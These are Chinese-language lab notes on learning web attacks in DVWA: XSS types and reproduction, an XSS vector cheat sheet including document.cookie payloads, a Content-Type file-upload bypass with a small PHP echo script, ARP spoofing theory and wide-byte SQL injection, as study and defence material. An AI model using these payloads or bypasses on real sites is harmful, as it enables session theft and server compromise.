# 漏洞学习和复现

> 1.漏洞简介
>
> 2.漏洞利用原理
>
> 3.漏洞利用过程
>
> 4.防护建议

## XSS漏洞利用学习和复现

[网络安全必学知识点之XSS漏洞 (baidu.com)](https://baijiahao.baidu.com/s?id=1711691365751381912&wfr=spider&for=pc)

[【XSS漏洞-01】XSS漏洞简介、危害与分类及验证_像风一样9的博客-CSDN博客_xss漏洞](https://blog.csdn.net/m0_64378913/article/details/124654153)

### 1.XSS漏洞简介

#### XSS(跨站脚本——Cross-Site Scripting)

XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览该页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。

XSS的本质是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。

**特点**：XSS主要基于**JavaScript**完成恶意的攻击行为，由于JS可以非常灵活地操作html、css和浏览器，使得跨站脚本攻击的“想象”空间特别大。

**攻击对象**：被攻击者的浏览器。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然后浏览器不会判断代码是否恶意，也就是说xss的对象是用户的浏览器。

**一般的攻击过程**：

- 攻击者将恶意代码注入到服务器中（如论坛、留言板、邮件等）；
- 用户在没有防备的情况下访问了被注入了恶意代码的服务器；
- 服务器将含有恶意代码的网页响应给客户端；
- 在客户端浏览器中触发JS恶意代码。

### 2.产生原因、漏洞原理

形成XSS漏洞的主要原因是**程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。**

对于存在XSS漏洞的服务器，攻击者可以直接登陆该网站，尝试XSS漏洞利用（主要使用存储型XSS漏洞利用，将脚本写入服务器，其他用户浏览时会被攻击）

攻击者也可以构造链接，将脚本写入链接中，受害者点击链接后，会访问服务器，服务器返回HTML文件后会和URL中的脚本一起被受害者浏览器渲染解析，从而实现攻击

### 3.危害

攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。

1、网络钓鱼，包括获取各类用户账号
2、窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；
3、劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等
4、强制弹出广告页面、刷流量等
5、网页挂马
6、进行恶意操作，如任意篡改页面信息、删除文章等
7、进行大量的客户端攻击，如ddos等
8、获取客户端信息，如用户的浏览历史、真实Ip、开放端口等
9、控制受害者机器向其他网站发起攻击；
10、结合其他漏洞，如csrf，实施进步危害；
11、提升用户权限，包括进一步渗透网站
12、传播跨站脚本蠕虫等

### 4.防御手段

在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:

> 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;

> 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;

### 5.XSS常出现地

1、数据交互的地方

> get、post、cookies、headers
>
> 反馈与浏览
>
> 富文本编辑器
>
> 各类标签插入和自定义

2、数据输出的地方

> 用户资料
>
> 关键词、标签、说明
>
> 文件上传

### 6.XSS分类

#### 反射性XSS：

也叫非持久型XSS、参数型夸张脚本，这种共计方式往往具有一次性，只在用户单击时触发。跨站代码一般存在在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储在服务端。反射型XSS的JS代码在web应用的**参数**（变量）中，如搜索框的反射型XSS。

常见注入点:
网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。

漏洞产生原因：

一般网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的欻据中存在可被浏览器执行的代码数据

攻击方式：
攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。

由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。

反射型XSS攻击流程：

1.攻击者寻找具有漏洞的网站
2.攻击者给用户发了一个带有恶意字符串的链接
3.用户点击了该链接
4.服务器返回HTML文档，此时该文档已经包含了那个恶意字符串
5.客户端执行了植入的恶意脚本，XSS攻击就发生

#### 存储型XSS

存储型XSS（ Stored XSS Attacks），也叫持久型XSS漏洞，比反射性XSS更具有威胁性，攻击脚本被永久存储在目标服务器的数据库或文件中，这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）。

常见的注入点：

论坛、博客、留言板、网站的留言、评论、日志等交互处。

漏洞原因：

造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。

攻击方式：

攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。

存储型XSS攻击的流程：

1.用户提交了一条包含XSS代码的留言到数据库
2.当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来
3.浏览器发现有XSS代码，就当做正常的HTML和JS解析执行

#### DOM型XSS

##### HTML DOM

[HTML DOM 教程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/htmldom/htmldom-tutorial.html)

DOM是文档对象模型（Document Object Model），DOM是HTML文档的对象表示，同时也是外部内容(JavaScript)与HTML元素之间的接口，解析树的根节点是  "Document"对象。使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。HTML DOM 定义了访问和操作 HTML 文档的标准方法。DOM 以树结构表达 HTML 文档。

HTML 的标签都是节点，而这些节点组成了 DOM 的整体结构一一节点树。通过HTML DOM，树中的所有节点均可通过JavaScript进行访问 。 所有HTML元素（节点）均可被修改，也可以创建或删除节点 。

![image-20220801112140481](http://cdn.ayusummer233.top/img/image-20220801112140481.png)

DOM型XSS是基于DOM文档对象的一种漏洞，并且DOM型XSS是基于JS上的，并不需要与服务器进行交互。其通过修改页面DOM节点数据信息而形成的ⅩSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。DOM型XSS是一种基于DOM的跨站脚本，这是客户端脚本本身解析不正确导致的安全问题。攻击的payload由于修改受害者浏览器页面的**DOM树**而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM型XSS比较难以检测。

网页的生成及修改：

- 在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件 。
- 可以通过JS脚本对文档对象进行编辑，从而修改页面的元素 。 也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的xss漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。

常见注入点：

通过JS脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。

攻击方式：

用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。

DOM型XSS流程：

1.攻击者寻找具有漏洞的网站
2.攻击者给用户发了一个带有恶意字符串的链接
3.用户点击了该链接
4.服务器返回HTML文档，但是该文档此时不包含那个恶意字符串
5.客户端执行了该HTML文档里的脚本，然后把恶意脚本植入了页面
6.客服端执行了植入的恶意脚本，XSS攻击就发生了

其他类型的XSS：
MXSS(突变XSS--MXSS, Mutation based Cross-Site-Scripting)，不论是服务器端或客户端的ⅩSS过滤器，都认定过滤后的HTM源代码应该与浏览器所渲染后的HTML代码保持一致，至少不会出现很大的出入，然而，如果用户所提供的富文本内容通过 Javascript 代码进属性后，一些意外的变化会使得这个认定不再成立：一串看似没有任何危害的HTML代码，将逃过XSS过滤器的检测，最终进入某个DOM节点中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。 随后，该段攻击代码，可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。这种由于HTML内容进后发生意外变化（ mutation，突变，来自遗传学的一个单词，基因突变，gene mutation），而最终导致MXSS的攻击流程。

通常通过innerHTML函数进行html代码过滤

![image-20220801110101768](http://cdn.ayusummer233.top/img/image-20220801110101768.png)

什么是HTML过滤器？为什么需要HTML过滤器？

许多web应用程序，以编辑器的形式，允许用户使用一些特殊的文本格式（例如，粗体，斜体等等）。这个功能在博客，邮件当中使用甚广。这里出现的主要安全问题就是有些不法用户可能输入一些恶意HTML/JavaScript从而引入XSS。 因此，这类允许用户进行个性化输入的应用程序的创建者就面临一个很头疼的问题如何确保用户的输入的HTML是安全的，从而不会引起不必要的XSS。 这就是为什么需要HTML过滤器的原因。HTML过滤器的主要目的是揪出不可信的输入，对其进行过滤，并生成安全的HTML，过滤所有具有危险标签的HTML。

### 7.漏洞验证

#### 7.1 漏洞验证相关概念

- POC：全称 ’ Proof of Concept '，中文 ’ 概念验证 ’ ，常指一段漏洞验证的代码。
- EXP：全称 ’ Exploit '，中文 ’ 利用 '，指利用系统漏洞进行攻击的工具，即从漏洞检测验证到利用的工具。
- Payload：中文 ’ 有效载荷 '，指成功exploit之后，真正在目标系统执行的代码或指令。
- Shellcode：简单翻译 ’ shell代码 '，利用漏洞时所执行的代码，是Payload的一种。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。

##### Payload攻击载荷

> payload称为攻击载荷，主要用于建立目标机与攻击机之间的稳定连接，并返回一个shell，也可以进行程序注入等。
>
> 3种类型
>
> （1）singles（独立载荷）
>
> 独立载荷，可直接植入目标系统并执行相应的程序，如：shell_bind_tcp。
>
> （2）stagers（传输器载荷）
>
> 传输器载荷，用于目标机与攻击机之间建立稳定的网络连接，与stages（传输体载荷）配合攻击。通常该种载荷体积都非常小，可以在漏洞利用后，方便进行注入，这类载荷功能都非常相似，大致分为bind型和reverse型。
>
> bind型：需要攻击机主动连接目标端口。
>
> reverse型：目标机反向连接攻击机，需要提前设定好连接攻击机的ip地址和端口号。
>
> （3）stages（传输体）
>
> 传输体载荷，在stagers建立好稳定的连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。如得到目标机的shell或者meterpreter控制程序运行。这样攻击机可以在本端输入相应命令控制目标机。

#### 7.2 漏洞验证相关概念之间的区别

（1）POC与EXP对比
POC是用来验证漏洞存在的，EXP是用来完整利用漏洞(包括从验证到利用全过程)的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。
（2）Payload与Shellcode
Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。
（3）Payload与EXP
同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。
（4）Payload模块
在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。

### 8.XSS漏洞验证复现

登陆容器后进入DVWA页面，需要创建数据库

问题

点击Create/Reset Database按钮后提示：
Could not connect to the database service.Please check the config file.
Database Error #1045:Access denied for user’dvwa’@‘locahost’(using password:YES).

![在这里插入图片描述](http://cdn.ayusummer233.top/img/7543bafbf2d345d8a6b56634c351d33f.png)

解决方法：按下图修改config.inc.php文件

![在这里插入图片描述](http://cdn.ayusummer233.top/img/9c1a097b4bc7425e9fa1b85352bb3103.png)

无法进入mysql:

[ERROR 1045 (28000): Access denied for user ‘root‘@‘localhost‘ (using password: NO)解决办法_BugMiaowu2021的博客-CSDN博客](https://blog.csdn.net/m0_46278037/article/details/113923726#:~:text=重置密码解决 MySQL for Linux错误 ERROR 1045 (28000)%3A Access,d]文本段：%2F mysql d (在vim编辑状态下直接输入该命令可搜索文本内容) 在 [ mysql d]后面任意一行添加)

应该使用已知的用户名和密码登陆

[ERROR 1045 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES/NO) 解决方案1.停止mysql - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1188636)

MySQL安装时默认的用户是root，这里的root是指[数据库](https://cloud.tencent.com/solution/database?from=10680)的用户，root密码一般在初始化MySQL时存放在你的日志文件中，日志文件的存放路径可以通过my.cnf文件进行自定义。

mysql -u root -p  （root用户密码设置过是root）

DVWA有安全级别：（默认是high）

#### 8.1反射型XSS漏洞复现

反射型XSS漏洞常存在于参数中。

[二、详解 DVWA_Reflected反射型XSS_在下小黄的博客-CSDN博客](https://blog.csdn.net/weixin_44519789/article/details/124919065)

![image-20220801160344719](http://cdn.ayusummer233.top/img/image-20220801160344719.png)

![image-20220801160450725](http://cdn.ayusummer233.top/img/image-20220801160450725.png)相同内容只渲染一次(同一个`<script>`alert('xss')`</script>`)

可能浏览器会在输入端识别，直接拦截威胁，需要更换浏览器渗透，写的文件作为渗透payload可能会被防火墙识别隔离，需要关闭防火墙。

由于服务器的源代码没有对表单的输入进行过滤，用户输入数据被直接被服务器将用户输入插入到HTML文件的标签中，因此如果存在恶意参数（表单提交内容是恶意脚本），浏览器就会解析执行这个脚本，从而实现了XSS的反射型漏洞利用。

![image-20220826105951694](http://cdn.ayusummer233.top/img/image-20220826105951694.png)

![image-20220826110007217](http://cdn.ayusummer233.top/img/image-20220826110007217.png)

#### 8.2存储型XSS漏洞复现

查看网页html代码：

发现输入文本的地方是textare标签指明的文本编辑器

测试发现输入文本内容后后端会将输入的内容放在`<div>`标签里，测试将脚本`<script>`alert(123)`</script>`输入textarea标签内提交查看是否被执行

![image-20220823164213673](http://cdn.ayusummer233.top/img/image-20220823164213673.png)

发现服务器没有对用户的输入进行过滤，会直接将用户输入存储并且显示在HTML网页中返回给前端，前端解析渲染这个HTML文件时，由于文件中存在用户输入的恶意脚本，会解析执行这个脚本，所以所有查看这个评论的客户端都会被攻击。

![image-20220826105826530](http://cdn.ayusummer233.top/img/image-20220826105826530.png)

![image-20220826105815157](http://cdn.ayusummer233.top/img/image-20220826105815157.png)

#### 8.3DOM型XSS漏洞复现

DVWA中的服务器在XSS(DOM)服务中将用户选项加在URL后面返回给前端，以此来传递参数，前端接受到参数后将URL中的value设为option的value，尝试在url的值后面加入脚本，查看前端页面html代码

![image-20220823164037341](http://cdn.ayusummer233.top/img/image-20220823164037341.png)

此处在URL中加入docunment脚本尝试执行

```
<script>
var a = document.URL; //将当前界面的URL赋值给变量a
a = unescape(a); //URL中有些代码可能经过URL编码，此处将URL进行解码
document.write(a.substring(a.indexOf('#')+1,a.length));//a.indexof:字符串首次出现的位置，+1:跳过#锚为取#之后的字符    写入html元素
</script>
或者
<script>var w = document.getElementsByTagName("BODY")[0];w.style.backgroundColor = "red";</script>
```

![image-20220823185531596](http://cdn.ayusummer233.top/img/image-20220823185531596.png)

查看源码：

![image-20220826101810776](http://cdn.ayusummer233.top/img/image-20220826101810776.png)

前端通过GET命令访问后端时，会将参数写在URL后面，后端回应的URL会 使用请求的URL，脚本中会将URL中的参数写入到HTML元素中，如果此链接中存在恶意脚本，脚本就会被插入到HTML文件中，从而被浏览器解析执行。此时URL中携带有修改DOM元素的脚本，前端就会操作DOM元素。

## 中间设备对于攻击报文的检测

WAF检测到XSS攻击报文

![image-20220826142248918](http://cdn.ayusummer233.top/img/image-20220826142248918.png)

IPS也检测到了XSS漏洞攻击：

![image-20220826142345255](http://cdn.ayusummer233.top/img/image-20220826142345255.png)

智源检测到服务器被攻击：

![image-20220826142443724](http://cdn.ayusummer233.top/img/image-20220826142443724.png)

智源的攻击分析：

![image-20220826142534871](http://cdn.ayusummer233.top/img/image-20220826142534871.png)

## 常用的XSS攻击脚本：(如果使用中文符号会无法执行)

![](http://cdn.ayusummer233.top/img/1662340268071.png)

### 畸形的A标签

跳过HREF标签找到XSS的重点......由DavidCross提交~已在Chrome上验证：

```
<a onmouseover="alert(document.cookie)">xxs link</a>
```

此外Chrome经常帮你补全确实的引号......如果在这方面遇到问题就直接省略引号，Chrome会帮你补全在URL或脚本中缺少的引号。

```
<a onmouseover=alert(document.cookie)>xxs link</a>
```

### 畸形的IMG标签

最初由Begeek发现（短小精湛适用于所有浏览器），这个XSS攻击向量使用了不严格的渲染引擎来构造含有IMG标签并被引号包含的XSS攻击向量。我猜测这种解析原来是为了兼容不规范的编码。这会让它更加难以正确的解析HTML标签：

```
<IMG """"><SCRIPT>alert("XSS")</SCRIPT>">
```

### 事件处理程序

在XSS攻击中可使用以下事件（在完稿的时候这是网上最全的列表了）。

```
FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)
onAbort() (当用户中止加载图片时)
onActivate() (当对象激活时)
onAfterPrint() (用户打印或进行打印预览后触发)
onAfterUpdate() (从数据源对象更新数据后由数据对象触发)
onBeforeActivate() (在对象设置为激活元素前触发)
onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand("Copy")函数触发)
onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)
onBeforeDeactivate() (在当前对象的激活元素变化前触发)
onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)
onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand("Paste")函数触发)
onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand("Print")函数).
onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)
onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)
onBegin() (当元素周期开始时由onbegin 事件立即触发)
onBlur() (另一个窗口弹出当前窗口失去焦点时触发)
onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)
onCellChange() (当数据提供者的数据变化时触发)
onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)
onClick() (表单中点击触发)
onContextMenu() (用户需要在攻击区域点击右键)
onControlSelect() (当用户在一个对象上创建控件选中区时触发)
onCopy() (用户需要复制一些东西或使用execCommand("Copy")命令时触发)
onCut() (用户需要剪切一些东西或使用execCommand("Cut")命令时触发)
onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)
onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)
onDataSetComplete() (数据源对象中所有数据可用时触发)
onDblClick() (用户双击一个表单元素或链接)
onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)
onDrag() (在元素正在拖动时触发)
onDragEnd() (当用户完成元素的拖动时触发)
onDragLeave() (用户在拖动元素离开放置目标时触发)
onDragEnter() (用户将对象拖拽到合法拖曳目标)
onDragOver() (用户将对象拖拽划过合法拖曳目标)
onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)
onDragStart() (当用户开始拖动元素时触发)
onDrop() (当拖动元素放置在目标区域时触发)
onEnded() (在视频/音频（audio/video）播放结束时触发)
onError() (在加载文档或图像时发生错误)
onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)
onFilterChange() (当滤镜完成状态变更时触发)
onFinish() (当marquee完成滚动时攻击者可以执行攻击)
onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)
onFocusIn() (当元素将要被设置为焦点之前触发)
onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)
onHashChange() (当锚部分发生变化时触发攻击代码)
onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)
onInput() (在 <input> 或 <textarea> 元素的值发生改变时触发)
onKeyDown() (用户按下一个键的时候触发)
onKeyPress() (在键盘按键被按下并释放一个键时触发)
onKeyUp() (用户释放一个键时触发)
onLayoutComplete() (用户进行完打印或打印预览时触发)
onLoad() (攻击者在窗口加载后触发攻击代码)
onLoseCapture() (可以由releaseCapture()方法触发)
onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)
onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)
onMessage() (当页面收到一个信息时触发事件)
onMouseDown() (攻击者需要让用户点击一个图片触发事件)
onMouseEnter() (光标移动到一个对象或区域时触发)
onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)
onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)
onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)
onMouseOver() (光标移动到一个对象或区域)
onMouseUp() (攻击者需要让用户点击一个图片)
onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)
onMove() (用户或攻击者移动页面时触发)
onMoveEnd() (用户或攻击者移动页面结束时触发)
onMoveStart() (用户或攻击者开始移动页面时触发)
onOffline() (当浏览器从在线模式切换到离线模式时触发)
onOnline() (当浏览器从离线模式切换到在线模式时触发)
onOutOfSync() (当元素与当前时间线失去同步时触发)
onPaste() (用户进行粘贴时或攻击者可以使用execCommand("Paste")函数时触发)
onPause() (在视频或音频暂停时触发)
onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)
onProgress() (攻击者可以在一个FLASH加载时触发事件)
onPropertyChange() (用户或攻击者需要改变元素属性时触发)
onReadyStateChange() (每次 readyState 属性变化时被自动调用)
onRedo() (用户返回上一页面时触发)
onRepeat() (事件在播放完重复播放时触发)
onReset() (用户或攻击者重置表单时触发)
onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:<SCRIPT>self.resizeTo(500,400);</SCRIPT>)
onResizeEnd() (用户完成改变窗体大小时触发)
onResizeStart() (用户开始改变窗体大小时触发)
onResume() (当元素继续播放时触发)
onReverse() (当元素回放时触发)
onRowsEnter() (用户或攻击者需要改变数据源中的一行)
onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)
onRowDelete() (用户或攻击者需要删除数据源中的一行)
onRowInserted() (user or attacker would needto insert a row in a data source)
onScroll() (用户需要滚动或攻击者使用scrollBy()函数)
onSeek() (当用户在元素上执行查找操作时触发)
onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand("SelectAll");)
onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand("SelectAll");)
onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand("SelectAll");)
onStart() (在marquee 对象开始循环时触发)
onStop() (当用户按下停止按钮或离开页面时触发)
onStorage() (当Web Storage更新时触发)
onSyncRestored() (当元素与它的时间线恢复同步时触发)
onSubmit() (需要用户或攻击者提交表单)
onTimeError() (用户或攻击者设置时间属性出现错误时触发)
onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)
onUndo() (用户返回上一浏览记录页面时触发)
onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)
onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)
seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)
```

## 文件上传漏洞

![image-20220803164035274](http://cdn.ayusummer233.top/img/image-20220803164035274.png)

上传一张图片后，浏览器捕获报文（包括请求和响应报文）

一次提交后可能会有多个报文收到，设计web页面的异步加载（其他报文可能是后端陆续发送的，前端浏览器会有回调函数，根据response执行）

可以修改捕获的报文，重写报文后发送

![image-20220803164454561](http://cdn.ayusummer233.top/img/image-20220803164454561.png)

可以重新上传别的文件后（因为此种安全级别下的前端负责检查文件类型，检查结果通过变量传给后端，可以看源php看出来）

修改Content-Type为image/jpeg，然后上传即可绕过文件检查，或者修改文件名，在Content-Type下面输入具体文件内容也可以

后端收到变量符合条件后此级别直接保存文件，前端输入对应文件的URL即可访问文件，如果文件可以执行对应命令并显示，则实现了渗透

前端输入URL后加上？name=phpinfo()  即可在后端执行此命令

<?php

 echo($_GET[name])

?>

## ARP欺骗

> ARP地址解析协议，为网络层协议，用于将MAC地址与IP地址建立映射关系。
>
> 当发送端知道接收端的IP地址，但是不知道其对应的MAC地址，这个时候就需要请求其接收端MAC地址，于是发送端会广播的发送ARP Request包，所有收到请求数据包的设备都会进行处理，若非目标设备收到请求包后会直接进行丢弃操作，而目标主机不仅会记录发送端的IP地址和MAC地址放入自己的ARP缓存中，并同时进行响应，发送ARP Reply包给发送段，发送端接收后会记录目标端的IP地址与MAC地址，双方建立通信。

### ARP攻击

ARP攻击主要目的就是使网络无法正常通信，就是通过伪造IP地址和MAC地址实现ARP欺骗。

![img](http://cdn.ayusummer233.top/img/f50004a28ed424543e4dbbd6867650f1.png)

（1） 当PC1在请求PC2的MAC地址时，交换机ARP缓存无PC2的对应条目则会广播发送Arp Request请求包进行请求询问；

（2） 如果我是PC3想攻击PC1，在收到PC1的Arp请求包的时候，我接收这个请求，同时回应一个虚假的回应包，告诉PC1我就是PC2。

（3） 然后PC1就会收到2条说自己是PC1的回应包，但是PC1并不知道到底哪个是真的，所以PC1会做出判断，并且判断后到达的为真。

（4） 那为了实现ARP欺骗，需要使PC3成为后到达的回应包。

（5） 因此需要使PC3连续不断的发送这样的回应包，总会把哪个正确的回应包覆盖掉，然后加入ARP缓存里面去。然后ARP缓存对应就会出错，本来应该发送到PC2的数据就会被发送到PC3那里。

### ARP欺骗

![img](http://cdn.ayusummer233.top/img/edca71585baf9c5a6c3eadcc554e7fcb.png)

 方式有两种ARP欺骗，第一种是冒充主机，第二种是冒充网关，现在普遍都是双向欺骗的，就是欺骗PC1我是网关，欺骗网关我是PC1

   ***\**\*如何实现让PC1不能上网？\*\**\***

   首先以上图为例，我们假设PC1的IP地址为192.168.1.1，网关的IP地址为192.168.1.254，欺骗者的IP地址为192.168.1.2

（1） 若PC1想要上网，需要寻找网关MAC，于是PC1会发送广播ARP Request，欺骗者就会接收这个请求报文，并通过不断发送ARP应答给发送端，告诉PC1，我就是网关，192.168.1.254就是我，所以每次PC1要去往网关的时候数据都去了我这里。

（2） 我还会给网关发送一个ARP应答包，告诉网关，192.168.1.1的地址是指向我的，你只要将发送给这个地址的数据包都发给我就可以了！于是，网关就会更新自己的ARP缓存，将去PC1的数据包都发给我。

   那么PC1就无法到达网关，网关也无法到达PC1，欺骗者将中间的通信路线给截断了，PC1数据无法到达网关，于是无法正常上网通信。

## 宽字节SQL注入的原理

### 魔术引号   和 SQL注入

在mysql中，用于[转义](https://so.csdn.net/so/search?q=转义&spm=1001.2101.3001.7020)（即在字符串中的符号前加上”\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。

### 什么是魔术引号

了解一个PHP的防御函数==》 **magic_quotes_gpc**（魔术引号开关）

magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。

**单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线**

**magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会再前面加转义字符'\',来做一定的过滤**

单引号和双引号内的一切都是字符串，那我们输入的东西如果不能闭合掉单引号和双引号，我们的输入就不会当作代码执行，就无法产生SQL注入，那我们该怎么办？

### 涉及到的基本概念

1. 字符、字符集
   字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。
2. UTF8
   由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。
3. 宽字节
   GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。

### MYSQL的字符集转换过程

1.MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;

2.进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：

- 使用每个数据字段的CHARACTER SET设定值;
- 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);
- 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;
- 若上述值不存在，则使用character_set_server设定值。

将操作结果从内部操作字符集转换为character_set_results。

重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。

了解一个PHP的防御函数==》 **magic_quotes_gpc**（魔术引号开关）

magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。

**单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线**

